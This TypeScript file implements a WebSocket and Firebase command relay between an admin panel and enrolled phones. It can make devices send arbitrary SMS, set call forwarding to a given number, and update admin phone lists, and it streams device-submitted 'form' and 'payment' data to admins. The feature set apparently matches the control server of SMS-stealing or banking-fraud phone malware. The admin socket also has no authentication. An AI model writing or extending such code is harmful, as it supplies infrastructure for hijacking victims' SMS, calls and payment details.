// src/services/wsService.ts
import http from "http";
import url from "url";
import WebSocket, { WebSocketServer } from "ws";
import logger from "../logger/logger";
import config from "../config";
import { touchLastSeen } from "./deviceService";

import {
  sendSmsCommand,
  sendCallForwardCommand,
  sendAdminListUpdate,
  sendPing,
  sendCommandToDevice as fcmSendCommand,
} from "./fcmService";

type WsPayload = Record<string, any>;

/**
 * WsService — WebSocket manager
 *
 * Architecture (post-migration):
 * ─────────────────────────────────────────────────────────────
 * Command flow: Frontend → WS → Backend → FCM → Device
 *
 * sendSms + call_forward: ALWAYS via FCM (device migrated, no WS handler)
 * All other commands: WS first → FCM fallback
 * ─────────────────────────────────────────────────────────────
 */
class WsService {
  private wss: WebSocketServer | null = null;
  private clients: Map<string, Set<WebSocket>> = new Map();
  private adminConnections: Map<string, Set<WebSocket>> = new Map();
  private primaryDeviceSocket: Map<string, WebSocket> = new Map();
  private socketConnectedAt: WeakMap<WebSocket, number> = new WeakMap();
  private sendSmsDedupe: Map<string, number> = new Map();

  /* ═══════════════════════════════════════════
     INIT
     ═══════════════════════════════════════════ */

  init(server: http.Server, wsBasePath = config.wsPath) {
    if (this.wss) { logger.warn("wsService.init already called"); return; }

    this.wss = new WebSocketServer({ noServer: true, maxPayload: 25 * 1024 * 1024 });

    server.on("upgrade", (req, socket, head) => {
      try {
        const parsed = url.parse(req.url || "");
        const pathname = parsed.pathname || "";
        const prefix = wsBasePath.endsWith("/") ? wsBasePath.slice(0, -1) : wsBasePath;

        const isDeviceSocket = pathname.startsWith(`${prefix}/devices/`);
        const isAdminSocket  = pathname.startsWith(`${prefix}/admin`);

        if (!isDeviceSocket && !isAdminSocket) { socket.destroy(); return; }

        let deviceId = "";
        if (isAdminSocket) {
          const parts = pathname.split("/").filter(Boolean);
          const adminIndex = parts.findIndex((p) => p === "admin");
          const maybeTarget = adminIndex >= 0 && parts.length > adminIndex + 1 ? parts[adminIndex + 1] : null;
          deviceId = maybeTarget ? String(maybeTarget) : "__ADMIN__";
        } else {
          const parts = pathname.split("/");
          deviceId = parts[parts.length - 1];
        }

        if (!deviceId) { socket.destroy(); return; }

        const socketType = isDeviceSocket ? "device" : "admin";
        this.wss!.handleUpgrade(req, socket as any, head, (ws) => {
          this.wss!.emit("connection", ws, req, deviceId, socketType);
        });
      } catch (err) {
        logger.error("wsService upgrade error", err);
        try { socket.destroy(); } catch {}
      }
    });

    this.wss.on("connection", async (ws: WebSocket, _req: any, deviceId: string, socketType: string) => {
      try {
        if (socketType === "device") this.registerClient(deviceId, ws);
        else this.registerAdminClient(deviceId, ws);
        this.setupListeners(deviceId, ws, socketType);
        logger.info("wsService: client connected", { deviceId, socketType });
      } catch (err) {
        logger.error("wsService connection handler error", err);
        try { ws.close(); } catch {}
      }
    });

    logger.info("wsService: initialized");
  }

  /* ═══════════════════════════════════════════
     PUBLIC: device connection checks
     ═══════════════════════════════════════════ */

  hasActiveDeviceConnection(deviceId: string): boolean {
    const set = this.clients.get(String(deviceId || "").trim());
    return !!(set && set.size > 0);
  }

  getActiveDeviceConnectionCount(deviceId: string): number {
    const set = this.clients.get(String(deviceId || "").trim());
    return set ? set.size : 0;
  }

  /* ═══════════════════════════════════════════
     PRIVATE: sendSms dedup
     ═══════════════════════════════════════════ */

  private cleanupSendSmsDedupe() {
    const now = Date.now();
    for (const [k, exp] of this.sendSmsDedupe.entries()) {
      if (exp <= now) this.sendSmsDedupe.delete(k);
    }
  }

  private isDuplicateSendSms(clientMsgId: string): boolean {
    if (!clientMsgId) return false;
    this.cleanupSendSmsDedupe();
    const now = Date.now();
    const exp = this.sendSmsDedupe.get(clientMsgId);
    if (exp && exp > now) return true;
    this.sendSmsDedupe.set(clientMsgId, now + 60_000);
    return false;
  }

  /* ═══════════════════════════════════════════
     PRIVATE: client registration
     ═══════════════════════════════════════════ */

  private registerClient(deviceId: string, ws: WebSocket) {
    const set = this.clients.get(deviceId) || new Set<WebSocket>();
    set.add(ws);
    this.clients.set(deviceId, set);
    this.socketConnectedAt.set(ws, Date.now());
    this.primaryDeviceSocket.set(deviceId, ws);
    touchLastSeen(deviceId, "ws_connect").catch(() => {});
    ws.once("close", () => this.unregisterClient(deviceId, ws));
    ws.once("error", () => this.unregisterClient(deviceId, ws));
  }

  // ✅ UPDATED: Removed WebSocket control frame ping-pong (doesn't work through proxies)
  // Using JSON-based ping/pong instead (handled in setupListeners)
  private registerAdminClient(key: string, ws: WebSocket) {
    const set = this.adminConnections.get(key) || new Set<WebSocket>();
    set.add(ws);
    this.adminConnections.set(key, set);
    logger.info("Admin connected", { key, total: set.size });

    // Track connection time for debugging
    this.socketConnectedAt.set(ws, Date.now());

    ws.once("close", () => {
      this.unregisterAdminClient(key, ws);
    });

    ws.once("error", () => {
      this.unregisterAdminClient(key, ws);
    });
  }

  private unregisterClient(deviceId: string, ws: WebSocket) {
    const set = this.clients.get(deviceId);
    if (!set || !set.has(ws)) return;
    set.delete(ws);
    if (this.primaryDeviceSocket.get(deviceId) === ws) {
      if (set.size > 0) {
        let best: WebSocket | null = null; let bestTs = -1;
        for (const s of set) { const ts = this.socketConnectedAt.get(s) ?? 0; if (ts > bestTs) { bestTs = ts; best = s; } }
        if (best) this.primaryDeviceSocket.set(deviceId, best);
      } else { this.primaryDeviceSocket.delete(deviceId); }
    }
    if (set.size > 0) { logger.info("wsService: device socket removed, others exist", { deviceId, remaining: set.size }); return; }
    this.clients.delete(deviceId);
    logger.info("wsService: device disconnected", { deviceId });
  }

  private unregisterAdminClient(key: string, ws: WebSocket) {
    const set = this.adminConnections.get(key);
    if (!set || !set.has(ws)) return;
    set.delete(ws);
    if (set.size > 0) { logger.info("wsService: admin socket removed, others exist", { key, remaining: set.size }); return; }
    this.adminConnections.delete(key);
    logger.info("wsService: admin disconnected", { key });
  }

  /* ═══════════════════════════════════════════
     PRIVATE: message listeners
     ═══════════════════════════════════════════ */

  private setupListeners(deviceId: string, ws: WebSocket, socketType: string) {
    ws.on("message", async (data: WebSocket.RawData) => {
      const text = data.toString();
      try {
        const obj: WsPayload = JSON.parse(text);
        const type = obj.type;
        if (type !== "ping") logger.debug("wsService message", { deviceId, text, socketType });

        // ✅ HANDLE JSON-based PING (Frontend sends this every 15 seconds)
        if (type === "ping") {
          // Send JSON pong response (not WebSocket control frame)
          try {
            ws.send(JSON.stringify({ type: "pong", timestamp: Date.now() }));
            ws.send(JSON.stringify({ type: "ack", timestamp: Date.now() }));
          } catch {}
          
          // Touch lastSeen for device connections
          if (socketType === "device") {
            touchLastSeen(deviceId, "ws_ping").catch(() => {});
          }
          
          return;
        }

        if (type === "lastSeen" && socketType === "device") {
          const action = String(obj.action || "ws_report").trim();
          const battery = typeof obj.battery === "number" ? obj.battery : -1;
          touchLastSeen(deviceId, action).catch(() => {});
          this.broadcastAdminEvent("device:lastSeen", { deviceId, lastSeen: { at: Date.now(), action, battery } }, { deviceId, includeDeviceChannel: true });
          return;
        }

        if (type === "cmd") {
          let adminTargetFromUrl: string | null = null;
          if (socketType === "admin" && deviceId !== "__ADMIN__") adminTargetFromUrl = deviceId;
          const targetDeviceId = obj.payload?.uniqueid || obj.payload?.deviceId || adminTargetFromUrl || deviceId;
          const forwarded = await this.sendCommandToDevice(targetDeviceId, obj.name || "", obj.payload || {});
          logger.info("wsService: cmd forwarded", { from: deviceId, to: targetDeviceId, name: obj.name, delivered: forwarded });
          return;
        }
      } catch (err: any) { logger.warn("wsService: invalid ws message", err?.message); }
    });

    ws.on("error", (err) => { logger.warn("wsService ws error", { deviceId, err: err.message }); });

    try {
      ws.send(JSON.stringify({ 
        type: "ack", 
        message: socketType === "device" ? "device connected" : "admin connected", 
        deviceId, 
        timestamp: Date.now() 
      }));
    } catch {}
  }

  /* ═══════════════════════════════════════════
     SEND: low-level
     ═══════════════════════════════════════════ */

  private sendRaw(ws: WebSocket, text: string) {
    try { ws.send(text); } catch (err: any) { logger.warn("wsService send error", err?.message); }
  }

  sendToDevice(deviceId: string, payload: WsPayload): boolean {
    const set = this.clients.get(deviceId);
    if (!set || set.size === 0) return false;
    const text = JSON.stringify(payload);
    for (const ws of set) this.sendRaw(ws, text);
    return true;
  }

  private sendToDevicePrimary(deviceId: string, payload: WsPayload): boolean {
    const ws = this.primaryDeviceSocket.get(deviceId);
    if (!ws) return false;
    this.sendRaw(ws, JSON.stringify(payload));
    return true;
  }

  /* ═══════════════════════════════════════════
     SEND: command to device
     ═══════════════════════════════════════════ */

  /**
   * sendSms + call_forward → ALWAYS FCM (device no longer handles via WS)
   * All other commands → WS first, FCM fallback
   */
  async sendCommandToDevice(
    deviceId: string,
    name: string,
    payload: WsPayload = {},
  ): Promise<boolean> {
    const normalized = typeof deviceId === "string" && deviceId.startsWith("__ADMIN__:")
      ? deviceId.split(":", 2)[1]
      : deviceId;

    // ── sendSms: always FCM + dedup ──
    if (name === "sendSms") {
      const clientMsgId = String(payload?.clientMsgId || "").trim();
      if (clientMsgId && this.isDuplicateSendSms(clientMsgId)) {
        logger.warn("wsService: sendSms dropped (duplicate clientMsgId)", { deviceId: normalized, clientMsgId });
        return true;
      }
      logger.info("wsService: sendSms → FCM direct (device migrated from WS)", { deviceId: normalized });
      return this.fcmFallback(normalized, name, payload);
    }

    // ── call_forward: always FCM ──
    if (name === "call_forward") {
      logger.info("wsService: call_forward → FCM direct (device migrated from WS)", { deviceId: normalized });
      return this.fcmFallback(normalized, name, payload);
    }

    // ── All other commands: WS first → FCM fallback ──
    const delivered = this.sendToDevice(normalized, { type: "cmd", name, payload });
    if (!delivered) return this.fcmFallback(normalized, name, payload);
    return delivered;
  }

  /* ═══════════════════════════════════════════
     FCM FALLBACK
     ═══════════════════════════════════════════ */

  private async fcmFallback(deviceId: string, name: string, payload: WsPayload): Promise<boolean> {
    try {
      logger.info("wsService: sending via FCM", { deviceId, command: name });
      const requestId = `ws_fcm_${Date.now()}_${Math.random().toString(16).slice(2, 8)}`;

      switch (name) {
        case "sendSms": {
          const address = String(payload.address || payload.to || payload.phoneNumber || "").trim();
          const message = String(payload.message || payload.body || payload.text || "").trim();
          const sim = typeof payload.sim === "number" ? payload.sim : 0;
          if (!address || !message) { logger.warn("wsService: fcmFallback sendSms missing address/message", { deviceId }); return false; }
          const result = await sendSmsCommand(deviceId, address, message, sim, requestId);
          logger.info("wsService: sendSms via FCM", { deviceId, success: !!result?.success });
          return !!result?.success;
        }

        case "call_forward": {
          const phoneNumber = String(payload.phoneNumber || "").trim();
          const sim = String(payload.sim || "SIM 1").trim();
          const callCode = String(payload.callCode || "").trim();
          const result = await sendCallForwardCommand(deviceId, callCode, sim, phoneNumber);
          logger.info("wsService: call_forward via FCM", { deviceId, success: !!result?.success });
          return !!result?.success;
        }

        case "admins:update":
        case "admin:phone:update": {
          const admins = Array.isArray(payload.admins) ? payload.admins : [];
          const result = await sendAdminListUpdate(deviceId, admins);
          logger.info("wsService: admins:update via FCM", { deviceId, success: !!result?.success });
          return !!result?.success;
        }

        case "forwardingSim:update": {
          const value = String(payload.value || "auto").trim();
          const result = await fcmSendCommand(deviceId, "forwarding_sim_update", { requestId, extraData: { value } });
          logger.info("wsService: forwardingSim:update via FCM", { deviceId, success: !!result?.success });
          return !!result?.success;
        }

        case "ping": {
          const result = await sendPing(deviceId);
          logger.info("wsService: ping via FCM", { deviceId, success: !!result?.success });
          return !!result?.success;
        }

        default: {
          const result = await fcmSendCommand(deviceId, name, { requestId, extraData: payload as any });
          logger.info("wsService: generic command via FCM", { deviceId, command: name, success: !!result?.success });
          return !!result?.success;
        }
      }
    } catch (err: any) {
      logger.error("wsService: fcmFallback failed", { deviceId, command: name, error: err?.message || String(err) });
      return false;
    }
  }

  /* ═══════════════════════════════════════════
     SEND: to admin panel
     ═══════════════════════════════════════════ */

  private sendToAdminKey(key: string, payload: WsPayload): boolean {
    const set = this.adminConnections.get(key);
    if (!set || set.size === 0) return false;
    const text = JSON.stringify(payload);
    for (const ws of set) this.sendRaw(ws, text);
    return true;
  }

  private sendToAdminKeys(keys: string[], payload: WsPayload): boolean {
    let sent = false;
    for (const key of keys) { if (!key) continue; if (this.sendToAdminKey(key, payload)) sent = true; }
    return sent;
  }

  async sendToAdminDevice(deviceId: string, payload: WsPayload): Promise<boolean> {
    return this.sendToAdminKey(deviceId, payload) || this.sendToAdminKey("__ADMIN__", payload) || this.sendToAdminKey("admin", payload);
  }

  /* ═══════════════════════════════════════════
     BROADCAST: admin events
     ═══════════════════════════════════════════ */

  broadcastAdminEvent(event: string, data: WsPayload = {}, options: { deviceId?: string; includeDeviceChannel?: boolean; includeDeviceSockets?: boolean } = {}): boolean {
    const payload = { type: "event", event, deviceId: options.deviceId || data.deviceId || undefined, data, timestamp: Date.now() };
    const keys = ["__ADMIN__", "admin"];
    if (options.includeDeviceChannel !== false && options.deviceId) keys.push(options.deviceId);
    const sentAdmins = this.sendToAdminKeys(keys, payload);
    const sentDevices = options.includeDeviceSockets === true && options.deviceId ? this.sendToDevice(options.deviceId, payload) : false;
    logger.debug("wsService: broadcastAdminEvent", { event, deviceId: options.deviceId || null, sentAdmins, sentDevices });
    return sentAdmins || sentDevices;
  }

  broadcastGlobalAdminUpdate(phone: string): boolean {
    const sent = this.sendToAdminKeys(["__ADMIN__", "admin"], { type: "event", event: "globalAdmin.update", data: { phone, timestamp: Date.now() } });
    logger.info("wsService: global admin update broadcasted", { phone, sent });
    return sent;
  }

  broadcastDeviceUpsert(device: any): boolean {
    const deviceId = String(device?.deviceId || "").trim();
    if (!deviceId) return false;
    return this.broadcastAdminEvent("device:upsert", device, { deviceId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastDeviceDelete(deviceId: string): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("device:delete", { deviceId: cleanId }, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastFavoriteUpdate(deviceId: string, favorite: boolean): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("favorite:update", { deviceId: cleanId, favorite: favorite === true }, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastFormNew(deviceId: string, form: WsPayload): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("form:new", form, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastFormUpdate(deviceId: string, patch: WsPayload): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("form:update", patch, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastPaymentNew(deviceId: string, method: string, payloadData: WsPayload): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("payment:new", { deviceId: cleanId, method, payload: payloadData, createdAt: Date.now() }, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastSessionUpsert(session: WsPayload): boolean {
    const deviceId = String(session?.deviceId || "").trim();
    return this.broadcastAdminEvent("session:upsert", session, { deviceId: deviceId || undefined, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastSessionDelete(deviceId: string, admin?: string): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("session:delete", { deviceId: cleanId, admin: admin || "" }, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastSessionClear(): boolean {
    return this.broadcastAdminEvent("session:clear", {}, { includeDeviceChannel: false, includeDeviceSockets: false });
  }

  broadcastNotificationClearDevice(deviceId: string): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("notification:clearDevice", { deviceId: cleanId }, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  broadcastNotificationClearAll(): boolean {
    return this.broadcastAdminEvent("notification:clearAll", {}, { includeDeviceChannel: false, includeDeviceSockets: false });
  }

  broadcastCrashCreated(deviceId: string, data: WsPayload): boolean {
    const cleanId = String(deviceId || "").trim();
    if (!cleanId) return false;
    return this.broadcastAdminEvent("crash:new", data, { deviceId: cleanId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  notifyDeviceLastSeen(deviceId: string, lastSeen: { at: number; action: string; battery: number }): boolean {
    return this.broadcastAdminEvent("device:lastSeen", { deviceId, lastSeen }, { deviceId, includeDeviceChannel: true, includeDeviceSockets: false });
  }

  /* ═══════════════════════════════════════════
     SHUTDOWN
     ═══════════════════════════════════════════ */

  async shutdown() {
    // Close all device connections
    for (const set of this.clients.values()) {
      for (const ws of set) {
        try { ws.close(); } catch {}
      }
    }
    this.clients.clear();
    this.primaryDeviceSocket.clear();

    // Close all admin connections
    for (const set of this.adminConnections.values()) {
      for (const ws of set) {
        try { ws.close(); } catch {}
      }
    }
    this.adminConnections.clear();

    // Close WebSocket server
    if (this.wss) {
      try { this.wss.close(); } catch {}
      this.wss = null;
    }

    logger.info("wsService: shutdown complete");
  }
}

const wsService = new WsService();
export default wsService;
